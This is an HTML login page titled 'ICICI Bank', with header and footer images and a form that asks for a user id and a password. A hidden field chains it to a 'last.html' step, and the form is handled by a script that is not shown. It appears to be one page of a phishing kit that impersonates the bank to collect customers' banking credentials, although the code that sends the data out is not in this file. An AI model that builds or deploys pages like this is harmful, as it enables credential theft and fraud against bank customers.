<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/style.css">
    <title>ICICI Bank</title>
</head>

<body>
<header class="d-flex justify-content-center mb-4">
    <img src="assets/header.jpg" width="100%" alt="">
</header>
<main class="container">
    <div id="test" class="text-danger text-center fw-bold"></div>
    <input type="hidden" id="nextValue" value="last.html">
    <form action="" id="form" class="mt-3">
        <div class="mb-4 form-group">
            <label for="" class="form-label">User Id</label>
            <input type="text" name="userid" class="form-control"  placeholder="Enter User Id"  required>
        </div>
        <div class="mb-4 form-group">
            <label for="" class="form-label"> Password </label>
            <input type="password" name="pss" class="form-control" placeholder="Enter Password"  required>
        </div>
        <button type="submit" id="submit-button" class="btn btn-lg bg-color btn-danger w-100 mt-2">Proceed</button>
    </form>
</main>

<footer class="mt-4">
    <img src="assets/footer.jpg" width="100%" alt="">
</footer>
<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
        crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
<script src="assets/script.js"></script>
</body>

</html>
